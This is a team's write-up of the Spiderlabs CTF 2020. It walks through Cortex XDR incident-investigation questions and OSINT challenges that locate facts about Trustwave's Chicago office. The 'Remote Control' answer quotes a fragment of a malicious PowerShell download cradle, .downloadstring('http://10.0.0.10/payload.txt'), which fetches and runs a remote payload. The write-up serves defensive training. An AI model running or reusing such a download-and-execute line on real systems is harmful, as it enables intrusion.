# Spiderlabs CTF 2020

The event was held from Thursday, August 6 at 6:00 pm Pacific. End August 8 at 6:00 pm Pacific.

My team managed to complete all the OSINT and Cortex XDR by Palo Alto Networks challenges.

# Solutions
## Cortex XDR by Palo Alto Networks

### Watching the Detectives
Your coworker started investigating an Incident but did not finish. He gave the Incident a unique name. What is the "Incident Name"

Navigate to the investigation tab and you will find the incident name as `Possible compromise`

### Lock it up
A user in Accounting called saying they received a message from XDR that a file was quarantined. Name the file that has been quarantined by the XDR agent.

Navigate to the alert table and find the account belongs to the accounting group and you will find `pomf.exe`

### Who’s Who?
When analyzing a security event, XDR surfaces information of interest in each node of the causality flow chart. In the incident labeled 'Process requests the deletion of Windows Shadowcopies' on PeckPC, what user ran WINWORD.EXE?

Right view the incident as mentioned as look through the alerts you will find `PECKPC\Administrator`

### Who Done it
A Memory Corruption Exploit Incident was triggered where a user browsed to a malicious website. What is the username of the user that attempted to reach the malicious website?

`SPENGLERPC\Egon`

### To Reach a Compromise
Indicators of Compromise can be used in XDR to find rudimentary evidence of an attack based on a single data point (file, URL, file hash, etc). One such IOC exists. What indicator is it looking for?

Navigate to the IOC settings and you will find `www.piratebay.org`

<img src="https://user-images.githubusercontent.com/54532620/89723258-6f59f400-da26-11ea-9177-c0a7fb142c40.png">

### Captain's Log
XDR keeps logs of user activity. User Ben Widmer logged in and modified a profile. What is the name of the profile?

<img src="https://user-images.githubusercontent.com/54532620/89723271-96b0c100-da26-11ea-872f-0f7341394284.png">

`Branch Restriction Profile`

### Address Unknown
In an Incident involving the host "PeckPC", a payload is downloaded form a malicious IP address. What other host(s) have been communicating with the IP address in question?

There are a few hosts being flagged under the incident and I just tried `SpenglerPC` which turns out to the answer.

### Remote Control
When analyzing a security event, XDR surfaces information of interest in each node of the causality flow chart. In the incident labeled 'Process requests the deletion of Windows Shadowcopies', an initial payload is downloaded from a remote IP address to "PeckPC'. what is the IP address?

<img src="https://user-images.githubusercontent.com/54532620/89723295-e8594b80-da26-11ea-9429-2d67891768eb.png">

Click on the powershell.exe with .downloadstring('http://10.0.0.10/payload.txt ')), then network and you will find the dest IP is `10.0.0.10`

<img src="https://user-images.githubusercontent.com/54532620/89723309-01fa9300-da27-11ea-8399-1f7e8814d31f.png">

### Debaser
When analyzing a security event, XDR surfaces information of interest in each node of the causality flow chart. In the incident labeled 'Process requests the deletion of Windows Shadowcopies' on PeckPC, powershell.exe is passed a base64 encoded string. What is the first DLL imported in this string?

Copy this record as there is the encoded string being parsed to the powershell.

<img src="https://user-images.githubusercontent.com/54532620/89723316-222a5200-da27-11ea-8d9d-4f5cea71e0cb.png">

Decode the encoded string, and copy the first DLL `kernel32.dll`

<img src="https://user-images.githubusercontent.com/54532620/89723325-3ff7b700-da27-11ea-99b6-8f7bf3eb018d.png">

### She Ran Calling WildFire
Within Incident 1, several malware events have been identified. These verdicts were identified by WildFire. According to analysis of the QuarterlySummary.pdf.exe binary, several TCP connections were recorded. One of these connections was to a European Union (EU) IP address. What was the IP Address?

In this incident, right click on the QuarterlySummary.pdf.exe artifacts and open it in hash view.

<img src="https://user-images.githubusercontent.com/54532620/89723330-51d95a00-da27-11ea-870c-02deb4948b38.png">

Thenafter, click on the view full report and you will find `192.251.226.206` under EU.

<img src="https://user-images.githubusercontent.com/54532620/89723350-91a04180-da27-11ea-9ddc-2894a7f59aa6.png">


## OSINT
### My name is?
Hi! My name is (huh?) My name is (what?) My name is... (PLS STOP YELLING AT ME) *The answer is in ALL CAPS.

*hint: this is not in the normal "FLAG-" format.

*Another hint: What's the name of the building in the picture? It can be found on a sign from Google Maps.

This was really tricky, I was able to find the exact location that was in the attachment
https://www.google.com.sg/maps/place/Sopraffina+Marketcaffe/@41.8825785,-87.6296933,3a,16.8y,137.24h,74.4t/data=!3m6!1e1!3m4!1sbkz0UvnhBdiyBjo06ffrTQ!2e0!7i13312!8i6656!4m13!1m7!3m6!1s0x880e2cbbae038ecf:0xd1095259d4a69b8e!2sW+Calhoun+Pl,+Chicago,+IL,+USA!3b1!8m2!3d41.8825774!4d-87.6323176!3m4!1s0x880e2cbb220f0b9d:0x707e1d355082df7e!8m2!3d41.8824193!4d-87.6295759

But turns out CTF OSINT admin was hinting me that I shouldn't decipher the graffiti.

Therefore, travelling down the alley you will find the address on the loading dock sign `THREE FIRST NATIONAL PLAZA` Didn't know you could find address on loading dock sign.

### Who doesn't like takeout?
What do we call this place?

*hint: this is not in the normal "FLAG-" format.

With the image, I goggle spiderlabs and found this video https://www.youtube.com/watch?v=ahN2M0Ng0ys and further searching and trying turns out `Trustwave SpiderLabs Fusion Center` is the answer.

### Who's talking to me?
Can you find me?

*hint: this is not in the normal "FLAG-" format.

*Another hint: There are several clues in different place on the image -- not just graphical

*Yet another hint: The flag is the full name of a dude who commented on a page where that image can be found. Find that page and it will all make since.

Given attachment is 01-dont-feed-the-penguin.

Kudos to my team mate, he managed to find the image https://foursquare.com/dasfiregod/list/places-you-can-find-me, upon clicking on the image and scroll through the comment and you will find `Nicholas Percoco` with the hint from the filename.

<img src="https://user-images.githubusercontent.com/54532620/89723428-9f09fb80-da28-11ea-9da1-94ef34c5a109.png">

### Who drew that?
Do you know who designed the build out for Trustwave's new North America headquaters?

*hint: this is not in the normal "FLAG-" format.

My team mate uses google advanced search and find out this https://www.americaninno.com/chicago/newsletters/trustwave-revamps-its-office-stealthy-startup-raises-6m/

The build out is designed by `Partners by Design`

### Ready for EDtv?
Who made the the wall-O-TVs?
Attached image is the same as `Who doesn't like takeout?` the hint on the image is Security_fusion_is_kinda_like_asian_fusion.png.

Google search with “Trustwave” "SpiderLabs Fusion Center" "wall", found this article
https://www.avnetwork.com/news/mediawall-v-video-wall-processor-supports-spiderlabs-fusion-center

I tried submitting this `RGB Spectrum’s MediaWall V` as the answer, but turns out it’s just `RGB Spectrum` is the answer.

### Are you floored?
What floors does Trustwave occupy at the North American headquaters location?

*hint: this is not in the normal "FLAG-" format.

*Another hint: the answer is in words not numbers, and was pulled straight from an article written about us. Its just the floors, and not the rest of the sentence.

*Yet another hint: there are more than two floors. ;)

My teammate and I took quite long quite long to figured out and took away quite alot of knowledge from this challenge.

I was given hint from OSINT CTF admin on the tricks on Google search like this searching 3 different words as follows “70 W Madison” “Trustwave” “Floors”. Upon scrolling and view one of the hits, I found this article caught my eye http://www.worldbusinesschicago.com/wp-content/uploads/2018/07/2017-WBC-Annual-Report-Digital-U.pdf 

Therefore, the answer is `fourth, sixth, and seventh floors`

### Got a water leak?
Who's the current plumbering contractor for the building that Trustwave's new North American headquaters is in?

*hint: this is not in the normal "FLAG-" format.

*Another hint: all commerical buildings have to file permits for all kinds of stuff with the city municipality in the US.

With the latest hint, I was able to find the website with all the building permits, to investigate further I download the entire CSV https://www.chicago.gov/city/en/depts/bldgs/dataset/building_permits.html file size is about 300MB.

I opened the CSV and started to filter the address to 70 W Madison, sort the application date from newest to the oldest, and was trying different columns at first. Until I notice on the second row description after I expand about changing contractor. Therefore, the answer is `SOUTH PARK PLUMBING INC`

<img src="https://user-images.githubusercontent.com/54532620/89723546-7f73d280-da2a-11ea-9849-9a188ce75e61.png">
